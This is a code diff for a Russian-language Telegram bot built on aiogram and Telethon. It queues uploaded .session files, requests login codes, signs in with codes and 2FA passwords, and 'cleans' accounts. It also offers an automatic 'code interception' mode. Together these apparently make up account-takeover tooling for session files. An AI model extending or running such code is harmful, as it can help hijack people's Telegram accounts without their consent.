+        else:
+            await event.answer(text)
         return
 
     await state.set_state(MigrateStates.waiting_phone)
-    await message.answer(
-        "📱 <b>Создание новой сессии</b>\n\n"
-        "Отправь номер телефона в международном формате:\n"
-        "<code>+79001234567</code>\n\n"
-        "Бот запросит код и полностью очистит созданный аккаунт.",
-        reply_markup=cancel_kb(),
-    )
+    prompt = "📱 Отправьте номер телефона в международном формате (например, <code>+79001234567</code>):"
+    if isinstance(event, CallbackQuery):
+        await event.message.answer(prompt, reply_markup=cancel_kb())
+        await event.answer()
+    else:
+        await event.answer(prompt, reply_markup=cancel_kb())
 
 
 @router.message(MigrateStates.waiting_phone)
@@ -646,14 +777,8 @@ async def process_phone(message: Message, state: FSMContext):
     chat_id = message.chat.id
     raw = (message.text or "").strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
 
-    if not raw:
-        await message.answer("❌ Отправь номер телефона.")
-        return
-
     if raw.startswith("8") and len(raw) == 11:
         raw = "+7" + raw[1:]
-    elif raw.startswith("7") and len(raw) == 11:
-        raw = "+" + raw
     elif not raw.startswith("+"):
         raw = "+" + raw
 
@@ -663,114 +788,75 @@ async def process_phone(message: Message, state: FSMContext):
 
     phone = raw
     mig_id = str(uuid.uuid4())[:8]
+    status = await message.answer(f"⏳ Создание клиента для <code>{phone}</code>...")
 
-    status = await message.answer(f"⏳ Создаю клиент для <code>{phone}</code>...")
-
-    mig = ActiveMigration(
-        id=mig_id,
-        chat_id=chat_id,
-        phone=phone,
-        status_message=status,
-        is_new_session=True,
-        waiting_manual_code=True,
-    )
+    mig = ActiveMigration(id=mig_id, chat_id=chat_id, phone=phone, status_message=status, is_new_session=True, waiting_manual_code=True)
     current_migration[chat_id] = mig
 
     try:
         mig.temp_dir = Path(tempfile.mkdtemp(prefix=f"new_{chat_id}_{mig_id}_"))
-        new_session_path = str(mig.temp_dir / "new_session")
-
-        new_client = TelegramClient(
-            new_session_path,
-            settings.api_id,
-            settings.api_hash,
-            device_model=settings.device_model,
-            system_version=settings.system_version,
-            app_version=settings.app_version,
-            lang_code=settings.lang_code,
-            system_lang_code=settings.system_lang_code,
-        )
+        new_client = get_telethon_client(str(mig.temp_dir / "new_session"))
         await new_client.connect()
         mig.new_client = new_client
 
         result = await new_client.send_code_request(phone)
         mig.phone_code_hash = result.phone_code_hash
-
+        mig.last_activity = time.time()
         stats["started"] += 1
 
         await state.set_state(MigrateStates.waiting_manual_code)
-        await status.edit_text(
-            f"📩 Код отправлен на <code>{phone}</code>\n\n"
-            "Введи код из SMS / Telegram:",
-            reply_markup=cancel_kb(),
-        )
+        await status.edit_text(f"📩 Код отправлен на <code>{phone}</code>. Отправьте код:", reply_markup=cancel_kb())
 
     except FloodWaitError as e:
-        await status.edit_text(f"❌ FloodWait: подожди {e.seconds} сек.")
+        await status.edit_text(f"❌ Telegram FloodWait: подождите {e.seconds} с.")
         await cleanup_migration(mig, state)
     except Exception as e:
-        logger.exception("Ошибка при запросе кода для новой сессии")
-        await status.edit_text(f"❌ Ошибка: <code>{e}</code>")
+        logger.exception("Ошибка запроса кода")
+        await status.edit_text(f"❌ Ошибка запроса: {e}")
         await cleanup_migration(mig, state)
 
 
 @router.message(Command("cancel"))
-@router.callback_query(F.data == "cancel_queue")
+@router.callback_query(F.data == "cancel_all")
 async def cmd_cancel(event: Message | CallbackQuery, state: FSMContext):
     chat_id = event.from_user.id if isinstance(event, CallbackQuery) else event.chat.id
     await clear_user_queue(chat_id, state)
     stats["cancelled"] += 1
 
-    text = "✅ Очередь отменена."
+    text = "🛑 Все текущие процессы и сессии отменены."
     if isinstance(event, CallbackQuery):
-        await event.message.edit_text(text)
+        await event.message.edit_text(text, reply_markup=main_menu_kb(chat_id))
         await event.answer()
     else:
-        await event.answer(text)
+        await event.answer(text, reply_markup=main_menu_kb(chat_id))
 
 
 @router.message(F.document)
 async def process_session_file(message: Message, state: FSMContext):
     chat_id = message.chat.id
-
-    current_state = await state.get_state()
-    if current_state is not None:
-        await message.answer("❌ Сейчас идёт другой процесс. Сначала /cancel")
+    if await state.get_state() is not None:
+        await message.answer("❌ Завершите предыдущее действие или нажмите /cancel")
         return
 
     doc: Document = message.document
-
     if not doc.file_name or not doc.file_name.lower().endswith(".session"):
-        await message.answer("❌ Нужен файл <code>.session</code>")
+        await message.answer("❌ Принимаются исключительно файлы с расширением <code>.session</code>")
         return
 
     if len(user_queues.get(chat_id, [])) >= settings.max_queue_per_user:
-        await message.answer(f"❌ Очередь полная (макс. {settings.max_queue_per_user})")
+        await message.answer(f"❌ Очередь заполнена (лимит: {settings.max_queue_per_user})")
         return
 
     temp_dir = Path(tempfile.mkdtemp(prefix=f"queue_{chat_id}_"))
     file_path = temp_dir / doc.file_name
     await message.bot.download(doc, destination=file_path)
 
-    item = QueueItem(
-        id=str(uuid.uuid4())[:8],
-        chat_id=chat_id,
-        file_path=file_path,
-        original_name=doc.file_name,
-    )
-
-    if chat_id not in user_queues:
-        user_queues[chat_id] = []
-    user_queues[chat_id].append(item)
+    item = QueueItem(id=str(uuid.uuid4())[:8], chat_id=chat_id, file_path=file_path, original_name=doc.file_name)
+    user_queues.setdefault(chat_id, []).append(item)
 
     pos = len(user_queues[chat_id])
-    mode = "авто" if get_auto_mode(chat_id) else "ручной"
-    await message.answer(
-        f"📥 <b>{doc.file_name}</b> добавлен в очередь (позиция {pos})\n"
-        f"Режим кода: <b>{mode}</b>",
-        reply_markup=cancel_kb(),
-    )
-
+    mode = "Авто" if get_auto_mode(chat_id) else "Ручной"
+    await message.answer(f"📥 <b>{doc.file_name}</b> добавлен в очередь (#{pos})\nПерехват кода: <b>{mode}</b>", reply_markup=cancel_kb())
     stats["started"] += 1
 
     if not queue_workers.get(chat_id, False):
@@ -784,24 +870,18 @@ async def process_manual_code(message: Message, state: FSMContext):
 
     mig = current_migration.get(chat_id)
     if not mig or not mig.new_client or not mig.waiting_manual_code:
-        await message.answer("Сейчас нет ожидания кода.")
+        await message.answer("Нет ожидающих ввода кода процессов.")
         return
 
     if not code.isdigit() or not (4 <= len(code) <= 8):
-        await message.answer("❌ Код должен быть из 4–8 цифр.")
+        await message.answer("❌ Код должен содержать от 4 до 8 цифр.")
         return
 
-    status = await message.answer("⏳ Проверяю код...")
-
+    status = await message.answer("⏳ Авторизация...")
     try:
-        await mig.new_client.sign_in(
-            phone=mig.phone,
-            code=code,
-            phone_code_hash=mig.phone_code_hash,
-        )
+        await mig.new_client.sign_in(phone=mig.phone, code=code, phone_code_hash=mig.phone_code_hash)
         mig.waiting_manual_code = False
         await state.clear()
-        await status.edit_text("✅ Вход выполнен! Начинаю полную очистку...")
         await finalize(mig, status, state)
 
         if user_queues.get(chat_id):
@@ -810,11 +890,13 @@ async def process_manual_code(message: Message, state: FSMContext):
     except SessionPasswordNeededError:
         mig.waiting_manual_code = False
         mig.waiting_2fa = True
+        mig.last_activity = time.time()
         await state.set_state(MigrateStates.waiting_password)
-        await status.edit_text("🔒 Нужен облачный пароль (2FA). Отправь пароль:")
-
+        await status.edit_text("🔒 Аккаунт защищен 2FA-паролем. Отправьте его:")
+    except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
+        await status.edit_text(f"❌ Неверный или истекший код: {e}")
     except Exception as e:
-        await status.edit_text(f"❌ Ошибка: <code>{e}</code>")
+        await status.edit_text(f"❌ Сбой авторизации: {e}")
 
 
 @router.message(MigrateStates.waiting_password)
@@ -824,29 +906,23 @@ async def process_2fa(message: Message, state: FSMContext):
 
     mig = current_migration.get(chat_id)
     if not mig or not mig.new_client or not mig.waiting_2fa:
-        await message.answer("Сейчас нет ожидания пароля.")
+        await message.answer("Нет ожидающих пароль процессов.")
         return
 
-    if not password:
-        await message.answer("❌ Пароль пустой.")
-        return
-
-    status = await message.answer("⏳ Проверяю пароль...")
-
+    status = await message.answer("⏳ Проверка 2FA...")
     try:
         await mig.new_client.sign_in(password=password)
         mig.waiting_2fa = False
         await state.clear()
-        await status.edit_text("✅ 2FA пройден! Начинаю полную очистку...")
         await finalize(mig, status, state)
 
         if user_queues.get(chat_id):
             asyncio.create_task(queue_worker(chat_id, message.bot, state))
 
     except PasswordHashInvalidError:
-        await status.edit_text("❌ Неверный пароль.")
+        await status.edit_text("❌ Пароль 2FA не подходит. Попробуйте еще раз:")
     except Exception as e:
-        await status.edit_text(f"❌ Ошибка: <code>{e}</code>")
+        await status.edit_text(f"❌ Ошибка 2FA: {e}")
         await cleanup_migration(mig, state)
 
 
@@ -856,24 +932,52 @@ async def cmd_stats(message: Message):
         return
     total_queue = sum(len(q) for q in user_queues.values())
     await message.answer(
-        f"📊 Запусков: {stats['started']}\n"
-        f"Успешных: {stats['success']}\n"
-        f"Ошибок: {stats['failed']}\n"
-        f"В очереди: {total_queue}\n"
-        f"Обрабатывается: {len(current_migration)}"
+        f"📊 <b>Статистика сервиса</b>\n\n"
+        f"• Всего запусков: {stats['started']}\n"
+        f"• Успешно очищено: {stats['success']}\n"
+        f"• Ошибок обработки: {stats['failed']}\n"
+        f"• Отменено пользователем: {stats['cancelled']}\n"
+        f"• В очереди прямо сейчас: {total_queue}"
     )
 
 
-# ====================== ЗАПУСК ======================
+# ====================== ФОНОВЫЙ ТАЙМАУТ-ВОТЧДОГ ======================
+
+async def watchdog_task(bot: Bot):
+    """Очищает зависшие сессии, ожидающие ввода кода/2FA дольше лимита."""
+    while True:
+        await asyncio.sleep(60)
+        now = time.time()
+        timeout_sec = settings.session_timeout_minutes * 60
+        stale_chats = []
+
+        for chat_id, mig in list(current_migration.items()):
+            if (mig.waiting_2fa or mig.waiting_manual_code) and (now - mig.last_activity > timeout_sec):
+                stale_chats.append(chat_id)
+
+        for chat_id in stale_chats:
+            mig = current_migration.get(chat_id)
+            if mig:
+                logger.info(f"Таймаут сессии для chat_id {chat_id}")
+                try:
+                    await bot.send_message(chat_id, "⌛ Время ожидания кода/2FA истекло. Сессия сброшена.")
+                except Exception:
+                    pass
+                await cleanup_migration(mig)
+
+
+# ====================== ТОЧКА ВХОДА ======================
 
 async def main():
     bot = Bot(token=settings.bot_token, default=DefaultBotProperties(parse_mode="HTML"))
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
-    logger.info("Session Migrator Bot запущен")
+
+    asyncio.create_task(watchdog_task(bot))
+
+    logger.info("Bot v3.0 Ultimate запущен")
     await dp.start_polling(bot)
 
 
 if __name__ == "__main__":
     asyncio.run(main())
-
